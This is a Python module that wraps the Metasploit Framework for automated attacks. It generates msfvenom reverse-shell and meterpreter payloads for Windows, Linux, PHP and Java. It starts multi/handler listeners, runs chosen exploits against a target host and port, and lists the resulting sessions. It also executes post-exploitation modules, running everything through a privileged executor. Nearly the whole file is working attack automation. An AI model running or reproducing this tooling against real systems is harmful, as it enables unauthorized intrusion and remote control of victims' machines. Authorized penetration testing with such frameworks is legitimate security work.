"""
Metasploit Integration - Professional Exploit Framework
Complete MSF integration with payload generation, exploitation, and post-exploitation
"""

import os
import json
import subprocess
import tempfile
import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import re
from datetime import datetime

logger = logging.getLogger(__name__)

class MetasploitFramework:
    """
    Complete Metasploit Framework integration.
    
    Features:
    - Exploit search and execution
    - Payload generation (msfvenom)
    - Database operations
    - Session management
    - Post-exploitation modules
    - Listener management
    """
    
    def __init__(self):
        self.msf_path = self._find_msf_path()
        self.db_initialized = False
        self.sessions = {}
        
        # Common exploit categories
        self.exploit_categories = {
            'web': ['http', 'webapp', 'php', 'asp', 'jsp'],
            'network': ['tcp', 'udp', 'smb', 'ssh', 'ftp'],
            'windows': ['windows', 'smb', 'rdp', 'winrm'],
            'linux': ['linux', 'unix', 'ssh', 'apache'],
            'database': ['mysql', 'mssql', 'oracle', 'postgres'],
            'wireless': ['wifi', 'bluetooth', 'wireless']
        }
        
        # Common payloads
        self.common_payloads = {
            'windows': {
                'reverse_tcp': 'windows/meterpreter/reverse_tcp',
                'reverse_https': 'windows/meterpreter/reverse_https',
                'bind_tcp': 'windows/meterpreter/bind_tcp',
                'shell': 'windows/shell_reverse_tcp'
            },
            'linux': {
                'reverse_tcp': 'linux/x86/meterpreter/reverse_tcp',
                'reverse_https': 'linux/x86/meterpreter/reverse_https',
                'shell': 'linux/x86/shell_reverse_tcp'
            },
            'php': {
                'reverse_tcp': 'php/meterpreter_reverse_tcp',
                'shell': 'php/reverse_php'
            },
            'java': {
                'reverse_tcp': 'java/meterpreter/reverse_tcp',
                'shell': 'java/shell_reverse_tcp'
            }
        }
    
    def _find_msf_path(self) -> str:
        """Find Metasploit installation path."""
        common_paths = [
            '/usr/share/metasploit-framework',
            '/opt/metasploit-framework',
            '/usr/local/share/metasploit-framework'
        ]
        
        for path in common_paths:
            if Path(path).exists():
                return path
        
        # Try which command
        try:
            result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
            if result.returncode == 0:
                return str(Path(result.stdout.strip()).parent.parent)
        except Exception:
            pass
        
        return '/usr/share/metasploit-framework'
    
    def initialize_database(self) -> bool:
        """Initialize Metasploit database."""
        try:
            from modules.privilege_manager import privilege_manager
            
            # Start PostgreSQL if not running
            result = privilege_manager.execute_privileged(
                ['systemctl', 'start', 'postgresql'], 'msfdb', timeout=30
            )
            
            # Initialize MSF database
            result = privilege_manager.execute_privileged(
                ['msfdb', 'init'], 'msfdb', timeout=60
            )
            
            if result.returncode == 0:
                self.db_initialized = True
                logger.info("Metasploit database initialized")
                return True
            else:
                logger.error(f"Database init failed: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            return False
    
    def search_exploits(self, target: str, service: str = None, platform: str = None) -> List[Dict]:
        """Search for exploits matching criteria."""
        try:
            # Build search command
            search_terms = [target]
            if service:
                search_terms.append(service)
            if platform:
                search_terms.append(platform)
            
            search_query = ' '.join(search_terms)
            
            # Create MSF resource script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"search {search_query}\n")
                f.write("exit\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=30
                )
                
                exploits = self._parse_search_results(result.stdout)
                return exploits
                
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Exploit search error: {e}")
            return []
    
    def _parse_search_results(self, output: str) -> List[Dict]:
        """Parse msfconsole search output."""
        exploits = []
        lines = output.split('\n')
        
        for line in lines:
            if 'exploit/' in line and not line.strip().startswith('#'):
                parts = line.split()
                if len(parts) >= 4:
                    exploit = {
                        'name': parts[0],
                        'disclosure_date': parts[1] if parts[1] != '' else 'unknown',
                        'rank': parts[2],
                        'check': parts[3] if len(parts) > 3 else 'No',
                        'description': ' '.join(parts[4:]) if len(parts) > 4 else ''
                    }
                    exploits.append(exploit)
        
        return exploits
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, 
                        platform: str = 'windows', format: str = 'exe') -> Dict:
        """Generate payload using msfvenom."""
        try:
            # Get payload name
            if platform in self.common_payloads and payload_type in self.common_payloads[platform]:
                payload_name = self.common_payloads[platform][payload_type]
            else:
                payload_name = payload_type
            
            # Generate unique filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"payload_{platform}_{timestamp}.{format}"
            output_path = Path(f"/tmp/{filename}")
            
            # Build msfvenom command
            cmd = [
                'msfvenom',
                '-p', payload_name,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format,
                '-o', str(output_path)
            ]
            
            # Add platform-specific options
            if platform == 'windows':
                cmd.extend(['-a', 'x86', '--platform', 'windows'])
            elif platform == 'linux':
                cmd.extend(['-a', 'x86', '--platform', 'linux'])
            
            from modules.privilege_manager import privilege_manager
            result = privilege_manager.execute_privileged(cmd, 'msfvenom', timeout=60)
            
            if result.returncode == 0 and output_path.exists():
                return {
                    'success': True,
                    'payload_name': payload_name,
                    'file_path': str(output_path),
                    'file_size': output_path.stat().st_size,
                    'lhost': lhost,
                    'lport': lport,
                    'platform': platform,
                    'format': format,
                    'timestamp': timestamp
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr,
                    'payload_name': payload_name
                }
                
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
            return {'success': False, 'error': str(e)}
    
    def start_listener(self, payload: str, lhost: str, lport: int) -> Dict:
        """Start Metasploit listener."""
        try:
            # Create listener resource script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"use exploit/multi/handler\n")
                f.write(f"set payload {payload}\n")
                f.write(f"set LHOST {lhost}\n")
                f.write(f"set LPORT {lport}\n")
                f.write(f"exploit -j\n")
                f.write(f"jobs\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=30
                )
                
                if 'Started' in result.stdout:
                    listener_id = self._extract_job_id(result.stdout)
                    return {
                        'success': True,
                        'listener_id': listener_id,
                        'payload': payload,
                        'lhost': lhost,
                        'lport': lport,
                        'status': 'running'
                    }
                else:
                    return {
                        'success': False,
                        'error': result.stderr or 'Failed to start listener'
                    }
                    
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Listener start error: {e}")
            return {'success': False, 'error': str(e)}
    
    def _extract_job_id(self, output: str) -> Optional[str]:
        """Extract job ID from MSF output."""
        match = re.search(r'Job (\d+) started', output)
        return match.group(1) if match else None
    
    def run_exploit(self, exploit_name: str, target_host: str, target_port: int,
                   payload: str = None, options: Dict = None) -> Dict:
        """Run specific exploit against target."""
        try:
            # Create exploit resource script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"use {exploit_name}\n")
                f.write(f"set RHOSTS {target_host}\n")
                f.write(f"set RPORT {target_port}\n")
                
                if payload:
                    f.write(f"set payload {payload}\n")
                
                if options:
                    for key, value in options.items():
                        f.write(f"set {key} {value}\n")
                
                f.write("check\n")
                f.write("exploit\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=120
                )
                
                # Parse results
                success = 'Meterpreter session' in result.stdout or 'Command shell session' in result.stdout
                vulnerable = 'appears to be vulnerable' in result.stdout or 'The target is vulnerable' in result.stdout
                
                session_id = None
                if success:
                    session_match = re.search(r'session (\d+) opened', result.stdout)
                    if session_match:
                        session_id = session_match.group(1)
                
                return {
                    'success': success,
                    'vulnerable': vulnerable,
                    'exploit_name': exploit_name,
                    'target_host': target_host,
                    'target_port': target_port,
                    'session_id': session_id,
                    'output': result.stdout,
                    'timestamp': datetime.now().isoformat()
                }
                
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Exploit execution error: {e}")
            return {
                'success': False,
                'error': str(e),
                'exploit_name': exploit_name
            }
    
    def list_sessions(self) -> List[Dict]:
        """List active Meterpreter sessions."""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write("sessions -l\n")
                f.write("exit\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=30
                )
                
                return self._parse_sessions(result.stdout)
                
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Session list error: {e}")
            return []
    
    def _parse_sessions(self, output: str) -> List[Dict]:
        """Parse sessions list output."""
        sessions = []
        lines = output.split('\n')
        
        for line in lines:
            if re.match(r'^\s*\d+', line):
                parts = line.split()
                if len(parts) >= 5:
                    session = {
                        'id': parts[0],
                        'type': parts[1],
                        'info': parts[2],
                        'tunnel': parts[3],
                        'via': parts[4] if len(parts) > 4 else ''
                    }
                    sessions.append(session)
        
        return sessions
    
    def execute_post_module(self, session_id: str, module_name: str, options: Dict = None) -> Dict:
        """Execute post-exploitation module on session."""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"use {module_name}\n")
                f.write(f"set SESSION {session_id}\n")
                
                if options:
                    for key, value in options.items():
                        f.write(f"set {key} {value}\n")
                
                f.write("run\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=60
                )
                
                return {
                    'success': result.returncode == 0,
                    'module_name': module_name,
                    'session_id': session_id,
                    'output': result.stdout,
                    'error': result.stderr if result.returncode != 0 else None
                }
                
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Post-exploitation error: {e}")
            return {
                'success': False,
                'error': str(e),
                'module_name': module_name
            }
    
    def get_exploit_info(self, exploit_name: str) -> Dict:
        """Get detailed information about an exploit."""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"use {exploit_name}\n")
                f.write("info\n")
                f.write("exit\n")
                resource_file = f.name
            
            try:
                from modules.privilege_manager import privilege_manager
                result = privilege_manager.execute_privileged(
                    ['msfconsole', '-q', '-r', resource_file], 'msfconsole', timeout=30
                )
                
                return self._parse_exploit_info(result.stdout)
                
            finally:
                os.unlink(resource_file)
                
        except Exception as e:
            logger.error(f"Exploit info error: {e}")
            return {'error': str(e)}
    
    def _parse_exploit_info(self, output: str) -> Dict:
        """Parse exploit info output."""
        info = {}
        lines = output.split('\n')
        
        current_section = None
        for line in lines:
            line = line.strip()
            
            if line.startswith('Name:'):
                info['name'] = line.split(':', 1)[1].strip()
            elif line.startswith('Module:'):
                info['module'] = line.split(':', 1)[1].strip()
            elif line.startswith('Platform:'):
                info['platform'] = line.split(':', 1)[1].strip()
            elif line.startswith('Privileged:'):
                info['privileged'] = line.split(':', 1)[1].strip()
            elif line.startswith('License:'):
                info['license'] = line.split(':', 1)[1].strip()
            elif line.startswith('Rank:'):
                info['rank'] = line.split(':', 1)[1].strip()
            elif line.startswith('Disclosed:'):
                info['disclosed'] = line.split(':', 1)[1].strip()
            elif 'Description:' in line:
                current_section = 'description'
                info['description'] = ''
            elif current_section == 'description' and line:
                info['description'] += line + ' '
        
        return info
    
    def status(self) -> Dict:
        """Get Metasploit framework status."""
        msf_available = Path(self.msf_path).exists() or bool(
            subprocess.run(['which', 'msfconsole'], capture_output=True).returncode == 0
        )
        return {
            'msf_path': self.msf_path,
            'msf_available': msf_available,
            'db_initialized': self.db_initialized,
            'active_sessions': len(self.sessions),  # cached — no msfconsole spawn
            'exploit_categories': list(self.exploit_categories.keys()),
            'payload_platforms': list(self.common_payloads.keys())
        }

# Global instance
metasploit = MetasploitFramework()